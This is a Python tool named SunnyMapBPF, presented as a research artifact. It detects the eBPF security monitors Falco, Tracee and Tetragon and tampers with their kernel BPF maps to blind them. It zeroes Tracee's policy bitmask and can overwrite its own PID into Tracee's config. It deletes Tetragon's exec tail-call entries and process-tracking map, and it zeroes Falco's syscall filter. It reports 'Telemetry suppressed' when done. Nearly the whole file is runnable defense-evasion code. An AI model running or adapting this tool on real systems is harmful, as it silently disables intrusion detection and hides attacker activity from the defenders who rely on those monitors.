#!/usr/bin/env python3
"""
 ____                          __  __             ____  ____  _____
/ ___| _   _ _ __  _ __  _   _|  \/  | __ _ _ __ | __ )|  _ \|  ___|
\___ \| | | | '_ \| '_ \| | | | |\/| |/ _` | '_ \|  _ \| |_) | |_
 ___) | |_| | | | | | | | |_| | |  | | (_| | |_) | |_) |  __/|  _|
|____/ \__,_|_| |_|_| |_|\__, |_|  |_|\__,_| .__/|____/|_|   |_|
                          |___/             |_|

SunnyMapBPF — BPF Map State Modification Research Tool
Author: Azizcan Dastan (@azqzazq1)
Research: https://github.com/azqzazq1/SunnyMapBPF

Research artifact for reproducing BPF map state poisoning findings against
eBPF-based security monitors (Falco, Tracee, Tetragon). Intended for
controlled lab environments only.

Requires: CAP_BPF or CAP_SYS_ADMIN, bpftool
Usage:
    sudo python3 sunnymapbpf.py              # auto-detect and modify all
    sudo python3 sunnymapbpf.py --scan       # scan only, no modification
    sudo python3 sunnymapbpf.py --target tracee  # modify specific tool
    sudo python3 sunnymapbpf.py --self-exclude   # also hijack tracee_pid
"""

import subprocess
import json
import sys
import os
import time
import argparse
from typing import Optional

# ═══════════════════════════════════════════════════════════════════
#  Core BPF Map Operations
# ═══════════════════════════════════════════════════════════════════

def bpf_map_list():
    r = subprocess.run(["bpftool", "map", "list", "-j"], capture_output=True, text=True)
    return json.loads(r.stdout) if r.returncode == 0 else []

def bpf_map_dump(map_id=None, pinned=None):
    if pinned:
        cmd = ["bpftool", "map", "dump", "pinned", pinned, "-j"]
    else:
        cmd = ["bpftool", "map", "dump", "id", str(map_id), "-j"]
    r = subprocess.run(cmd, capture_output=True, text=True)
    return json.loads(r.stdout) if r.returncode == 0 else []

def bpf_map_update(map_id, key_hex, value_hex):
    cmd = f"bpftool map update id {map_id} key hex {key_hex} value hex {value_hex}"
    return subprocess.run(cmd, shell=True, capture_output=True).returncode == 0

def bpf_map_delete(map_id=None, pinned=None, key_hex=""):
    if pinned:
        cmd = f"bpftool map delete pinned {pinned} key hex {key_hex}"
    else:
        cmd = f"bpftool map delete id {map_id} key hex {key_hex}"
    return subprocess.run(cmd, shell=True, capture_output=True).returncode == 0

def parse_val(val_list):
    return [int(v, 16) if isinstance(v, str) else v for v in val_list]

def val_to_hex(val_ints):
    return " ".join(f"{b:02x}" for b in val_ints)

# ═══════════════════════════════════════════════════════════════════
#  Tool Detection
# ═══════════════════════════════════════════════════════════════════

TOOL_SIGNATURES = {
    "tracee": ["config_map", "sys_enter_tails", "sys_exit_tails", "policies_config"],
    "tetragon": ["tg_conf_map", "execve_map", "tg_stats_map"],
    "falco": ["interesting_sys", "syscall_exit_ta", "auxiliary_maps"],
}

def detect_tools():
    maps = bpf_map_list()
    if not maps:
        return {}

    map_names = {m.get("name", "") for m in maps}
    detected = {}

    for tool, sigs in TOOL_SIGNATURES.items():
        matches = [s for s in sigs if any(s in n for n in map_names)]
        if len(matches) >= 2:
            tool_maps = {}
            for m in maps:
                name = m.get("name", "")
                for s in sigs:
                    if s in name:
                        tool_maps[name] = m
            detected[tool] = {"maps": tool_maps, "signatures_matched": matches}

    return detected

# ═══════════════════════════════════════════════════════════════════
#  Tracee: config_map Modification
# ═══════════════════════════════════════════════════════════════════

def blind_tracee(stealth_pid=None):
    """
    Tracee v0.22-v0.24.x: Zero enabled_policies in config_map.

    config_entry_t layout:
      offset 0:   tracee_pid (u32)
      offset 14:  policies_version (u16)
      offset 216: enabled_policies (u64) — within embedded policies_config_t

    Setting enabled_policies=0 causes match_scope_filters() to return 0
    for ALL events. Bumping policies_version forces per-CPU cache invalidation.

    Optional: overwrite tracee_pid with our PID for self-exclusion.
    """
    maps = bpf_map_list()
    config = None
    for m in maps:
        if m.get("name") == "config_map" and m.get("type") == "array":
            config = m
            break

    if not config:
        return False, "config_map not found"

    map_id = config["id"]
    data = bpf_map_dump(map_id=map_id)
    if not data:
        return False, "failed to read config_map"

    val = parse_val(data[0]["value"])
    tracee_pid = int.from_bytes(bytes(val[0:4]), "little")
    version = int.from_bytes(bytes(val[14:16]), "little")
    enabled = int.from_bytes(bytes(val[216:224]), "little")

    info = f"config_map ID={map_id}, tracee_pid={tracee_pid}, version={version}, enabled_policies={enabled}"

    # Self-exclusion: overwrite tracee_pid with our PID
    if stealth_pid:
        pid_bytes = stealth_pid.to_bytes(4, "little")
        for i in range(4):
            val[i] = pid_bytes[i]

    # Zero enabled_policies
    for i in range(216, 224):
        val[i] = 0

    # Bump version to invalidate per-CPU cache
    new_ver = (version + 1) & 0xFFFF
    val[14] = new_ver & 0xFF
    val[15] = (new_ver >> 8) & 0xFF

    if bpf_map_update(map_id, "00 00 00 00", val_to_hex(val)):
        details = f"enabled_policies: {enabled}->0, version: {version}->{new_ver}"
        if stealth_pid:
            details += f", tracee_pid: {tracee_pid}->{stealth_pid}"
        return True, details
    return False, "map update failed"

# ═══════════════════════════════════════════════════════════════════
#  Tetragon: execve_calls + execve_map Modification
# ═══════════════════════════════════════════════════════════════════

TETRAGON_BASE = "/sys/fs/bpf/tetragon"

def blind_tetragon():
    """
    Tetragon v1.x: Delete execve_calls + clear execve_map.

    All maps pinned at /sys/fs/bpf/tetragon/ — no enumeration needed.

    1. execve_calls (PROG_ARRAY, 2 entries): Tail call targets for
       sched_process_exec handler. Deleting entries causes bpf_tail_call()
       to silently return, breaking the exec event pipeline.

    2. execve_map (HASH, keyed by PID): Process tracking used by ALL
       Tetragon BPF programs. Clearing makes every process invisible.
    """
    if not os.path.isdir(TETRAGON_BASE):
        return False, "tetragon pinned maps not found"

    results = []

    # Step 1: Kill exec pipeline via prog_array
    execve_calls = f"{TETRAGON_BASE}/__base__/event_execve/execve_calls"
    if os.path.exists(execve_calls):
        d0 = bpf_map_delete(pinned=execve_calls, key_hex="00 00 00 00")
        d1 = bpf_map_delete(pinned=execve_calls, key_hex="01 00 00 00")
        results.append(f"execve_calls: deleted {int(d0)+int(d1)}/2 tail call entries")

    # Step 2: Clear process tracking
    execve_map = f"{TETRAGON_BASE}/execve_map"
    if os.path.exists(execve_map):
        data = bpf_map_dump(pinned=execve_map)
        deleted = 0
        for entry in data:
            key = entry.get("key", [])
            key_hex = " ".join(
                (v.replace("0x", "") if isinstance(v, str) else f"{v:02x}")
                for v in key
            )
            if bpf_map_delete(pinned=execve_map, key_hex=key_hex):
                deleted += 1
        results.append(f"execve_map: deleted {deleted}/{len(data)} process entries")

    # Step 3: Also try to kill exit handler's lookup path
    # by clearing tg_execve_joined_info_map if it exists
    joined_map = f"{TETRAGON_BASE}/tg_execve_joined_info_map"
    if os.path.exists(joined_map):
        data = bpf_map_dump(pinned=joined_map)
        deleted = 0
        for entry in data:
            key = entry.get("key", [])
            key_hex = " ".join(
                (v.replace("0x", "") if isinstance(v, str) else f"{v:02x}")
                for v in key
            )
            if bpf_map_delete(pinned=joined_map, key_hex=key_hex):
                deleted += 1
        if deleted:
            results.append(f"tg_execve_joined_info_map: deleted {deleted} entries")

    return True, "; ".join(results)

# ═══════════════════════════════════════════════════════════════════
#  Falco: interesting_syscalls Modification
# ═══════════════════════════════════════════════════════════════════

def blind_falco():
    """
    Falco (modern BPF, libs v0.18+): Zero interesting_syscalls array.

    interesting_syscalls is a BPF ARRAY map with 512 entries (1 byte each).
    Falco's BPF probes check interesting_syscalls[NR] at the earliest point
    in the syscall handler. If the value is 0, the probe returns immediately.

    Zeroing all 512 entries disables monitoring for every syscall.
    """
    maps = bpf_map_list()
    isc = None
    for m in maps:
        if "interesting_sys" in m.get("name", "") and m.get("type") == "array":
            isc = m
            break

    if not isc:
        return False, "interesting_syscalls map not found"

    map_id = isc["id"]
    max_entries = isc.get("max_entries", 512)

    # Count currently active syscalls
    active_before = 0
    for i in range(min(max_entries, 512)):
        key = f"{i & 0xff:02x} {(i >> 8) & 0xff:02x} 00 00"
        r = subprocess.run(
            f"bpftool map lookup id {map_id} key hex {key} -j",
            shell=True, capture_output=True, text=True
        )
        if r.returncode == 0:
            val = json.loads(r.stdout).get("value", [])
            v = int(val[0], 16) if isinstance(val[0], str) else val[0]
            if v:
                active_before += 1

    # Zero all entries
    for i in range(max_entries):
        key = f"{i & 0xff:02x} {(i >> 8) & 0xff:02x} 00 00"
        bpf_map_update(map_id, key, "00")

    return True, f"interesting_syscalls ID={map_id}: {active_before} active syscalls -> 0"

# ═══════════════════════════════════════════════════════════════════
#  Main: Auto-Detect and Modify
# ═══════════════════════════════════════════════════════════════════

BANNER = r"""
 ____                          __  __             ____  ____  _____
/ ___| _   _ _ __  _ __  _   _|  \/  | __ _ _ __ | __ )|  _ \|  ___|
\___ \| | | | '_ \| '_ \| | | | |\/| |/ _` | '_ \|  _ \| |_) | |_
 ___) | |_| | | | | | | | |_| | |  | | (_| | |_) | |_) |  __/|  _|
|____/ \__,_|_| |_|_| |_|\__, |_|  |_|\__,_| .__/|____/|_|   |_|
                          |___/             |_|
        BPF Map State Modification Research Tool
        github.com/azqzazq1/SunnyMapBPF
"""

C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_CYAN = "\033[96m"
C_BOLD = "\033[1m"
C_DIM = "\033[2m"
C_RESET = "\033[0m"

MODIFY_FNS = {
    "tracee": blind_tracee,
    "tetragon": blind_tetragon,
    "falco": blind_falco,
}

def check_capabilities():
    if os.geteuid() != 0:
        print(f"{C_RED}[!] Not running as root. Need CAP_BPF or CAP_SYS_ADMIN.{C_RESET}")
        sys.exit(1)
    r = subprocess.run(["bpftool", "map", "list", "-j"], capture_output=True, text=True)
    if r.returncode != 0:
        print(f"{C_RED}[!] bpftool not found or BPF access denied.{C_RESET}")
        sys.exit(1)

def scan_mode():
    print(f"{C_CYAN}[*] Scanning for eBPF security tools...{C_RESET}\n")
    detected = detect_tools()
    if not detected:
        print(f"{C_YELLOW}[!] No eBPF security tools detected.{C_RESET}")
        return

    for tool, info in detected.items():
        sigs = ", ".join(info["signatures_matched"])
        print(f"{C_GREEN}[+] {tool.upper()} detected{C_RESET}")
        print(f"    Signatures: {sigs}")
        print(f"    Maps:")
        for name, m in info["maps"].items():
            frozen = "FROZEN" if m.get("frozen") else "WRITABLE"
            print(f"      ID:{m['id']:>5}  {name:<25} {m['type']:<18} [{frozen}]")
        print()

    total_maps = sum(len(i["maps"]) for i in detected.values())
    writable = sum(1 for i in detected.values() for m in i["maps"].values() if not m.get("frozen"))
    frozen = total_maps - writable
    print(f"{C_BOLD}Summary: {len(detected)} tool(s), {total_maps} security-critical maps ({writable} writable, {frozen} frozen){C_RESET}")

def modify_mode(target=None, self_exclude=False):
    detected = detect_tools()

    if target:
        if target not in detected:
            print(f"{C_RED}[!] {target} not detected on this system.{C_RESET}")
            sys.exit(1)
        targets = {target: detected[target]}
    else:
        targets = detected

    if not targets:
        print(f"{C_YELLOW}[!] No eBPF security tools detected.{C_RESET}")
        return

    results = {}
    for tool in targets:
        print(f"{C_CYAN}[*] Modifying {tool.upper()} map state...{C_RESET}")

        modify_fn = MODIFY_FNS.get(tool)
        if not modify_fn:
            print(f"{C_YELLOW}    [!] No modification primitive for {tool}{C_RESET}")
            continue

        if tool == "tracee" and self_exclude:
            success, detail = modify_fn(stealth_pid=os.getpid())
        elif tool == "tracee":
            success, detail = modify_fn()
        else:
            success, detail = modify_fn()

        if success:
            print(f"{C_GREEN}    [+] {detail}{C_RESET}")
            results[tool] = "MODIFIED"
        else:
            print(f"{C_RED}    [-] Failed: {detail}{C_RESET}")
            results[tool] = "FAILED"

    print(f"\n{C_BOLD}{'='*60}{C_RESET}")
    print(f"{C_BOLD}  Results{C_RESET}")
    print(f"{C_BOLD}{'='*60}{C_RESET}")
    for tool, status in results.items():
        color = C_GREEN if status == "MODIFIED" else C_RED
        print(f"  {tool.upper():<12} {color}{status}{C_RESET}")
    print(f"{C_BOLD}{'='*60}{C_RESET}")

    modified = sum(1 for s in results.values() if s == "MODIFIED")
    if modified == len(results):
        print(f"\n{C_GREEN}{C_BOLD}All {modified} tool(s) map state modified. Telemetry suppressed.{C_RESET}\n")
    elif modified > 0:
        print(f"\n{C_YELLOW}{modified}/{len(results)} tool(s) modified.{C_RESET}\n")

def main():
    parser = argparse.ArgumentParser(
        description="SunnyMapBPF — BPF Map State Modification Research Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  sudo python3 sunnymapbpf.py              auto-detect and modify all tools
  sudo python3 sunnymapbpf.py --scan       scan only, show detected tools
  sudo python3 sunnymapbpf.py --target tracee   modify only Tracee maps
  sudo python3 sunnymapbpf.py --self-exclude    also hijack tracee_pid"""
    )
    parser.add_argument("--scan", action="store_true",
                        help="enumerate tools and maps without modifying anything")
    parser.add_argument("--target", choices=["tracee", "tetragon", "falco"],
                        help="target a specific tool (default: all detected)")
    parser.add_argument("--self-exclude", action="store_true",
                        help="overwrite Tracee's tracee_pid for self-exclusion")
    parser.add_argument("--quiet", action="store_true",
                        help="minimal output")

    args = parser.parse_args()

    if not args.quiet:
        print(f"{C_CYAN}{BANNER}{C_RESET}")

    check_capabilities()

    if args.scan:
        scan_mode()
    else:
        modify_mode(target=args.target, self_exclude=args.self_exclude)


if __name__ == "__main__":
    main()
